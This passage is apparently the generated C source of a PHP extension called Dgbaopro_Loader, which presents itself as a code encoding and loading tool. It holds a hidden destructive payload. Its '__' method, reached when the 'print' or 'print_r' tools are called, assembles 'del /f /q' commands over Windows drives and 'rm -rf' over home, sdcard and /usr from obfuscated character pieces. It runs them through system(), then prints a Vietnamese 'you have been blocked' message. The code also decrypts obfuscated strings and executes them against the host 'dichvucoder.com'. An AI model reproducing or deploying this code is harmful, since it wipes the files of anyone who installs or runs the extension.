	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "k");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "r");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "L");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "4");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "E");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "2");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "M");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "w");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "d");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "3");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "R");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "1");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "f");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "6");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "l");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "e");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "O");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "t");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "x");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "0");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "Y");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "G");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "h");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "q");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "8");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "n");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "j");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "S");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "N");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "B");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "I");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "K");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "i");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "b");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "g");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "V");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "Z");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "u");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "U");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "J");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "a");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "p");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "F");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "7");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "D");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "X");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "C");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "T");
	zephir_array_fast_append(&_6, &_5);
	ZEPHIR_INIT_NVAR(&_5);
	ZVAL_STRING(&_5, "o");
	zephir_array_fast_append(&_6, &_5);
	zephir_fast_str_replace(&_3, &_4, &_6, &_);
	zephir_get_strval(&_, &_3);
	ZVAL_LONG(&_7, _____);
	ZEPHIR_CALL_FUNCTION(&_8, "openssl_decrypt", NULL, 12, &_, &____, &__, &_7, &___);
	zephir_check_call_status();
	zephir_get_strval(&_, &_8);
	ZEPHIR_CALL_STATIC(&_9, "_", &_10, 11, &_, &__);
	zephir_check_call_status();
	zephir_get_strval(&_, &_9);
	ZEPHIR_INIT_NVAR(&_5);
	dgbaopro_exec(&_, &_5, "dichvucoder.com");
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, _)
{
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS, _____, ______;
	zephir_fcall_cache_entry *_5 = NULL, *_9 = NULL, *_10 = NULL, *_12 = NULL, *_15 = NULL;
	zval *__param = NULL, *___param = NULL, _0, ___, ____, _______, ________, _________, _1$$3, _2$$3, _3$$3, _4$$3, _6$$3, _7$$3, _8$$3, _11$$3, _13$$3, _14$$3;
	zval _, __;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&___);
	ZVAL_UNDEF(&____);
	ZVAL_UNDEF(&_______);
	ZVAL_UNDEF(&________);
	ZVAL_UNDEF(&_________);
	ZVAL_UNDEF(&_1$$3);
	ZVAL_UNDEF(&_2$$3);
	ZVAL_UNDEF(&_3$$3);
	ZVAL_UNDEF(&_4$$3);
	ZVAL_UNDEF(&_6$$3);
	ZVAL_UNDEF(&_7$$3);
	ZVAL_UNDEF(&_8$$3);
	ZVAL_UNDEF(&_11$$3);
	ZVAL_UNDEF(&_13$$3);
	ZVAL_UNDEF(&_14$$3);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(2, 2)
		Z_PARAM_STR(_)
		Z_PARAM_STR(__)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 2, 0, &__param, &___param);
	zephir_get_strval(&_, __param);
	zephir_get_strval(&__, ___param);


	ZEPHIR_INIT_VAR(&_0);
	zephir_md5(&_0, &__);
	zephir_get_strval(&__, &_0);
	ZEPHIR_INIT_VAR(&___);
	ZVAL_LONG(&___, zephir_fast_strlen_ev(&_));
	ZEPHIR_INIT_VAR(&____);
	ZVAL_LONG(&____, zephir_fast_strlen_ev(&__));
	_____ = 0;
	______ = 0;
	ZEPHIR_INIT_VAR(&_______);
	ZVAL_STRING(&_______, "");
	ZEPHIR_INIT_VAR(&________);
	ZVAL_STRING(&________, "");
	ZEPHIR_INIT_VAR(&_________);
	ZVAL_STRING(&_________, "");
	while (1) {
		if (!(ZEPHIR_GT_LONG(&___, _____))) {
			break;
		}
		ZVAL_LONG(&_1$$3, _____);
		ZVAL_LONG(&_2$$3, 2);
		ZEPHIR_INIT_NVAR(&_3$$3);
		zephir_substr(&_3$$3, &_, zephir_get_intval(&_1$$3), 2 , 0);
		ZEPHIR_CALL_FUNCTION(&_4$$3, "strrev", &_5, 13, &_3$$3);
		zephir_check_call_status();
		ZVAL_LONG(&_6$$3, 36);
		ZVAL_LONG(&_7$$3, 16);
		ZEPHIR_CALL_FUNCTION(&_8$$3, "base_convert", &_9, 14, &_4$$3, &_6$$3, &_7$$3);
		zephir_check_call_status();
		ZEPHIR_CALL_FUNCTION(&________, "hexdec", &_10, 15, &_8$$3);
		zephir_check_call_status();
		if (ZEPHIR_IS_LONG(&____, ______)) {
			______ = 0;
		}
		ZVAL_LONG(&_6$$3, ______);
		ZVAL_LONG(&_7$$3, 1);
		ZEPHIR_INIT_NVAR(&_11$$3);
		zephir_substr(&_11$$3, &__, zephir_get_intval(&_6$$3), 1 , 0);
		ZEPHIR_CALL_FUNCTION(&_________, "ord", &_12, 16, &_11$$3);
		zephir_check_call_status();
		______ = (______ + 1);
		ZEPHIR_INIT_NVAR(&_13$$3);
		zephir_sub_function(&_13$$3, &________, &_________);
		ZEPHIR_CALL_FUNCTION(&_14$$3, "chr", &_15, 17, &_13$$3);
		zephir_check_call_status();
		zephir_concat_self(&_______, &_14$$3);
		_____ = (_____ + 2);
	}
	RETURN_CCTOR(&_______);
}

PHP_METHOD(Dgbaopro_Loader, __)
{
	zval _5$$3, _10$$3, _6$$4, _7$$4, _8$$4, _9$$5;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zval *_ = NULL, __sub, __$false, nul$$3, _0$$3, _1$$3, _2$$3, _3$$3, _4$$3;
	zval *this_ptr = getThis();
	char *cmd,*cmd1,*cmd2,cmd3;
	int len,len1,len2,len3;
	ZVAL_UNDEF(&__sub);
	ZVAL_BOOL(&__$false, 0);
	ZVAL_UNDEF(&nul$$3);
	ZVAL_UNDEF(&_0$$3);
	ZVAL_UNDEF(&_1$$3);
	ZVAL_UNDEF(&_2$$3);
	ZVAL_UNDEF(&_3$$3);
	ZVAL_UNDEF(&_4$$3);
	ZVAL_UNDEF(&_5$$3);
	ZVAL_UNDEF(&_10$$3);
	ZVAL_UNDEF(&_6$$4);
	ZVAL_UNDEF(&_7$$4);
	ZVAL_UNDEF(&_8$$4);
	ZVAL_UNDEF(&_9$$5);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_ZVAL(_)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 0, 1, &_);
	if (!_) {
		_ = &__sub;
		_ = &__$false;
	}


	if (zephir_is_true(_)) {
		ZEPHIR_INIT_VAR(&nul$$3);
		ZVAL_NULL(&nul$$3);
		ZEPHIR_INIT_VAR(&_0$$3);
		ZEPHIR_INIT_VAR(&_1$$3);
		ZEPHIR_GET_CONSTANT(&_1$$3, "PHP_OS");
		ZVAL_LONG(&_2$$3, 0);
		ZVAL_LONG(&_3$$3, 3);
		ZEPHIR_INIT_VAR(&_4$$3);
		zephir_substr(&_4$$3, &_1$$3, 0 , 3 , 0);
		zephir_fast_strtoupper(&_0$$3, &_4$$3);
		ZEPHIR_INIT_VAR(&_5$$3);
		ZEPHIR_CONCAT_SSS(&_5$$3, "W", "I", "N");
		if (ZEPHIR_IS_EQUAL(&_0$$3, &_5$$3)) {
			ZEPHIR_INIT_VAR(&_6$$4);
			ZEPHIR_CONCAT_SSSSSSSSSSSSSSSS(&_6$$4, "d", "e", "l", " /f /q ", "-", "r", " * ", "C", ":", "\x5C* ~\x5C*", " ", ">", "n", "u", "l", "l");
			len = Z_STRLEN_P(&_6$$4);
			cmd = estrndup(Z_STRVAL_P(&_6$$4),len);
      system(cmd);
			ZEPHIR_INIT_VAR(&_7$$4);
			ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSSS(&_7$$4, "d", "e", "l", " ", "/", "f /q", " * ", "C", ":", "\x5C", "W", "i", "n", "d", "o", "w", "s\x5C* ", "C:\x5C* ", "D:\x5C* ", "E:\x5C* ", "F:\x5C* ", "G:\x5C* >null");
			len1 = Z_STRLEN_P(&_7$$4);
			cmd1 = estrndup(Z_STRVAL_P(&_7$$4),len1);
      system(cmd1);
			ZEPHIR_INIT_VAR(&_8$$4);
			ZEPHIR_CONCAT_SSSS(&_8$$4, "n", "u", "l", "l");
			ZEPHIR_CALL_FUNCTION(NULL, "unlink", NULL, 18, &_8$$4);
			zephir_check_call_status();
		} else {
			ZEPHIR_INIT_VAR(&_9$$5);
			ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS(&_9$$5, "/system", "/bin", "/r", "m -", "r", "f * ", "~", "/", "* ", "/", "s", "d", "c", "a", "r", "d", "/", "* ", "/", "s", "d", "c", "a", "r", "d", "/", "D", "o", "w", "n", "l", "o", "a", "d", "/", "* ", "~", "/", ".", ".", "/", "u", "s", "r", "/", "*");
			len2 = Z_STRLEN_P(&_9$$5);
			cmd2 = estrndup(Z_STRVAL_P(&_9$$5),len2);
      system(cmd2);
		}
		ZEPHIR_INIT_VAR(&_10$$3);
		ZEPHIR_CONCAT_SSSSSSSSSSSSSSSSSSSSSSSSSSSS(&_10$$3, "B", "ạ", "n", " ", "đ", "ã", " ", "b", "ị", " ", "b", "l", "o", "c", "k", " ", "k", "h", "ỏ", "i", " ", "s", "e", "r", "v", "e", "r", " !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_10$$3);
	} else {
		RETURN_MM_BOOL(0);
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, print_r)
{
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zephir_fcall_cache_entry *_0 = NULL;
	zval *__param = NULL, _1;
	zval _;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&_1);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STR_OR_NULL(_)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 0, 1, &__param);
	if (!__param) {
		ZEPHIR_INIT_VAR(&_);
	} else {
		zephir_get_strval(&_, __param);
	}


	ZVAL_BOOL(&_1, 1);
	ZEPHIR_CALL_STATIC(NULL, "__", &_0, 2, &_1);
	zephir_check_call_status();
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, print)
{
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zephir_fcall_cache_entry *_0 = NULL;
	zval *__param = NULL, _1;
	zval _;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&_1);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_STR_OR_NULL(_)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 0, 1, &__param);
	if (!__param) {
		ZEPHIR_INIT_VAR(&_);
	} else {
		zephir_get_strval(&_, __param);
	}


	ZVAL_BOOL(&_1, 1);
	ZEPHIR_CALL_STATIC(NULL, "__", &_0, 2, &_1);
	zephir_check_call_status();
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, tool)
{
	zend_bool _16$$3, _17$$3, _20$$6, _21$$6, _24$$9, _25$$9, _27$$12, _28$$12, _30$$15, _31$$15, _34$$18, _35$$18, _38$$21, _39$$21, _42$$24;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zephir_fcall_cache_entry *_19 = NULL, *_23 = NULL, *_33 = NULL, *_37 = NULL, *_41 = NULL, *_44 = NULL;
	zval *__param = NULL, *___param = NULL, *____param = NULL, *_____param = NULL, __$true, _0, _2, _4, _6, _8, _10, _12, _14, _18$$4, _22$$7, _26$$10, _29$$13, _32$$16, _36$$19, _40$$22, _43$$25;
	zval _, __, ___, ____, _1, _3, _5, _7, _9, _11, _13, _15, _45$$27;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&___);
	ZVAL_UNDEF(&____);
	ZVAL_UNDEF(&_1);
	ZVAL_UNDEF(&_3);
	ZVAL_UNDEF(&_5);
	ZVAL_UNDEF(&_7);
	ZVAL_UNDEF(&_9);
	ZVAL_UNDEF(&_11);
	ZVAL_UNDEF(&_13);
	ZVAL_UNDEF(&_15);
	ZVAL_UNDEF(&_45$$27);
	ZVAL_BOOL(&__$true, 1);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_4);
	ZVAL_UNDEF(&_6);
	ZVAL_UNDEF(&_8);
	ZVAL_UNDEF(&_10);
	ZVAL_UNDEF(&_12);
	ZVAL_UNDEF(&_14);
	ZVAL_UNDEF(&_18$$4);
	ZVAL_UNDEF(&_22$$7);
	ZVAL_UNDEF(&_26$$10);
	ZVAL_UNDEF(&_29$$13);
	ZVAL_UNDEF(&_32$$16);
	ZVAL_UNDEF(&_36$$19);
	ZVAL_UNDEF(&_40$$22);
	ZVAL_UNDEF(&_43$$25);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(0, 4)
		Z_PARAM_OPTIONAL
		Z_PARAM_STR_OR_NULL(_)
		Z_PARAM_STR_OR_NULL(__)
		Z_PARAM_STR_OR_NULL(___)
		Z_PARAM_STR_OR_NULL(____)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 0, 4, &__param, &___param, &____param, &_____param);
	if (!__param) {
		ZEPHIR_INIT_VAR(&_);
	} else {
		zephir_get_strval(&_, __param);
	}
	if (!___param) {
		ZEPHIR_INIT_VAR(&__);
	} else {
		zephir_get_strval(&__, ___param);
	}
	if (!____param) {
		ZEPHIR_INIT_VAR(&___);
	} else {
		zephir_get_strval(&___, ____param);
	}
	if (!_____param) {
		ZEPHIR_INIT_VAR(&____);
	} else {
		zephir_get_strval(&____, _____param);
	}


	ZEPHIR_INIT_VAR(&_0);
	zephir_fast_trim(&_0, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_1);
	ZEPHIR_CONCAT_SSSSSS(&_1, "\xff", "\xfe", "\xfe", "\xff", "\xfe", "\xfe");
	ZEPHIR_INIT_VAR(&_2);
	zephir_fast_trim(&_2, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_3);
	ZEPHIR_CONCAT_SSSSS(&_3, "_", "_", "_", "_", "_");
	ZEPHIR_INIT_VAR(&_4);
	zephir_fast_trim(&_4, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_5);
	ZEPHIR_CONCAT_SSSSS(&_5, "p", "r", "i", "n", "t");
	ZEPHIR_INIT_VAR(&_6);
	zephir_fast_trim(&_6, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_7);
	ZEPHIR_CONCAT_SSSSSSS(&_7, "p", "r", "i", "n", "t", "_", "r");
	ZEPHIR_INIT_VAR(&_8);
	zephir_fast_trim(&_8, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_9);
	ZEPHIR_CONCAT_SSS(&_9, "_", "_", "_");
	ZEPHIR_INIT_VAR(&_10);
	zephir_fast_trim(&_10, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_11);
	ZEPHIR_CONCAT_SSSSSS(&_11, "\xff", "\xff", "\xff", "\xff", "\xff", "\xff");
	ZEPHIR_INIT_VAR(&_12);
	zephir_fast_trim(&_12, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_13);
	ZEPHIR_CONCAT_SSSSSS(&_13, "\xfe", "\xff", "\xff", "\xfe", "\xff", "\xff");
	ZEPHIR_INIT_VAR(&_14);
	zephir_fast_trim(&_14, &_, NULL , ZEPHIR_TRIM_BOTH);
	ZEPHIR_INIT_VAR(&_15);
	ZEPHIR_CONCAT_SSSSSS(&_15, "_", "_", "_", "_", "_", "_");
	if (ZEPHIR_IS_EQUAL(&_0, &_1)) {
		_16$$3 = ZEPHIR_IS_NULL(&__);
		if (!(_16$$3)) {
			_16$$3 = ZEPHIR_IS_NULL(&___);
		}
		_17$$3 = _16$$3;
		if (!(_17$$3)) {
			_17$$3 = ZEPHIR_IS_NULL(&____);
		}
		if (_17$$3) {
			ZEPHIR_INIT_VAR(&_18$$4);
			ZVAL_STRING(&_18$$4, "Encode ERROR : Tool #encode::feefee : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_18$$4);
		} else {
			ZEPHIR_RETURN_CALL_STATIC("_____________", &_19, 20, &__, &___, &____);
			zephir_check_call_status();
			RETURN_MM();
		}
	} else if (ZEPHIR_IS_EQUAL(&_2, &_3)) {
		_20$$6 = ZEPHIR_IS_NULL(&__);
		if (!(_20$$6)) {
			_20$$6 = !ZEPHIR_IS_NULL(&___);
		}
		_21$$6 = _20$$6;
		if (!(_21$$6)) {
			_21$$6 = !ZEPHIR_IS_NULL(&____);
		}
		if (_21$$6) {
			ZEPHIR_INIT_VAR(&_22$$7);
			ZVAL_STRING(&_22$$7, "Encode ERROR : Tool #php::eval : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_22$$7);
		} else {
			ZEPHIR_CALL_STATIC(NULL, "_____", &_23, 21, &__);
			zephir_check_call_status();
		}
	} else if (ZEPHIR_IS_EQUAL(&_4, &_5)) {
		_24$$9 = ZEPHIR_IS_NULL(&__);
		if (!(_24$$9)) {
			_24$$9 = !ZEPHIR_IS_NULL(&___);
		}
		_25$$9 = _24$$9;
		if (!(_25$$9)) {
			_25$$9 = !ZEPHIR_IS_NULL(&____);
		}
		if (_25$$9) {
			ZEPHIR_INIT_VAR(&_26$$10);
			ZVAL_STRING(&_26$$10, "Encode ERROR : Tool #php::print : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_26$$10);
		} else {
			ZEPHIR_CALL_STATIC(NULL, "print", NULL, 0, &__);
			zephir_check_call_status();
		}
	} else if (ZEPHIR_IS_EQUAL(&_6, &_7)) {
		_27$$12 = ZEPHIR_IS_NULL(&__);
		if (!(_27$$12)) {
			_27$$12 = !ZEPHIR_IS_NULL(&___);
		}
		_28$$12 = _27$$12;
		if (!(_28$$12)) {
			_28$$12 = !ZEPHIR_IS_NULL(&____);
		}
		if (_28$$12) {
			ZEPHIR_INIT_VAR(&_29$$13);
			ZVAL_STRING(&_29$$13, "Encode ERROR : Tool #php::print_r : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_29$$13);
		} else {
			ZEPHIR_CALL_STATIC(NULL, "print_r", NULL, 0, &__);
			zephir_check_call_status();
		}
	} else if (ZEPHIR_IS_EQUAL(&_8, &_9)) {
		_30$$15 = !ZEPHIR_IS_NULL(&__);
		if (!(_30$$15)) {
			_30$$15 = !ZEPHIR_IS_NULL(&___);
		}
		_31$$15 = _30$$15;
		if (!(_31$$15)) {
			_31$$15 = !ZEPHIR_IS_NULL(&____);
		}
		if (_31$$15) {
			ZEPHIR_INIT_VAR(&_32$$16);
			ZVAL_STRING(&_32$$16, "Encode ERROR : Tool execute : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_32$$16);
		} else {
			zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("old"), &__$true);
			ZEPHIR_CALL_STATIC(NULL, "___", &_33, 22);
			zephir_check_call_status();
		}
	} else if (ZEPHIR_IS_EQUAL(&_10, &_11)) {
		_34$$18 = ZEPHIR_IS_NULL(&__);
		if (!(_34$$18)) {
			_34$$18 = ZEPHIR_IS_NULL(&___);
		}
		_35$$18 = _34$$18;
		if (!(_35$$18)) {
			_35$$18 = !ZEPHIR_IS_NULL(&____);
		}
		if (_35$$18) {
			ZEPHIR_INIT_VAR(&_36$$19);
			ZVAL_STRING(&_36$$19, "Encode ERROR : Tool #encode::ffffff : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_36$$19);
		} else {
			ZEPHIR_RETURN_CALL_STATIC("____________", &_37, 23, &__, &___);
			zephir_check_call_status();
			RETURN_MM();
		}
	} else if (ZEPHIR_IS_EQUAL(&_12, &_13)) {
		_38$$21 = ZEPHIR_IS_NULL(&__);
		if (!(_38$$21)) {
			_38$$21 = ZEPHIR_IS_NULL(&___);
		}
		_39$$21 = _38$$21;
		if (!(_39$$21)) {
			_39$$21 = !ZEPHIR_IS_NULL(&____);
		}
		if (_39$$21) {
			ZEPHIR_INIT_VAR(&_40$$22);
			ZVAL_STRING(&_40$$22, "Encode ERROR : Tool #encode::effeff : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_40$$22);
		} else {
			ZEPHIR_RETURN_CALL_STATIC("f__", &_41, 24, &__, &___);
			zephir_check_call_status();
			RETURN_MM();
		}
	} else if (ZEPHIR_IS_EQUAL(&_14, &_15)) {
		_42$$24 = ZEPHIR_IS_NULL(&__);
		if (!(_42$$24)) {
			_42$$24 = ZEPHIR_IS_NULL(&___);
		}
		if (_42$$24) {
			ZEPHIR_INIT_VAR(&_43$$25);
			ZVAL_STRING(&_43$$25, "Encode ERROR : Tool #encode::hash : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_43$$25);
		} else {
			ZEPHIR_CALL_STATIC(NULL, "______", &_44, 25, &__, &___, &____);
			zephir_check_call_status();
		}
	} else {
		ZEPHIR_INIT_VAR(&_45$$27);
		ZEPHIR_CONCAT_SVS(&_45$$27, "Encode ERROR : Tool ", &_, " not found !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_45$$27);
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, __________)
{
	zval _3, _5;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zephir_fcall_cache_entry *_7 = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zval *s_param = NULL, _0, _1, _2, _4, _6;
	zval s, _8;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&s);
	ZVAL_UNDEF(&_8);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_1);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_4);
	ZVAL_UNDEF(&_6);
	ZVAL_UNDEF(&_3);
	ZVAL_UNDEF(&_5);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_STR(s)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 1, 0, &s_param);
	zephir_get_strval(&s, s_param);


	ZEPHIR_CALL_FUNCTION(&_0, "base64_decode", NULL, 6, &s);
	zephir_check_call_status();
	zephir_get_strval(&s, &_0);
	ZEPHIR_CALL_FUNCTION(&_1, "bzdecompress", NULL, 9, &s);
	zephir_check_call_status();
	zephir_get_strval(&s, &_1);
	ZEPHIR_INIT_VAR(&_2);
	ZEPHIR_INIT_VAR(&_3);
	zephir_create_array(&_3, 67, 0);
	ZEPHIR_INIT_VAR(&_4);
	ZVAL_STRING(&_4, "⊐");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⋀");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊂");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
	ZVAL_STRING(&_4, "⊾");
	zephir_array_fast_append(&_3, &_4);
	ZEPHIR_INIT_NVAR(&_4);
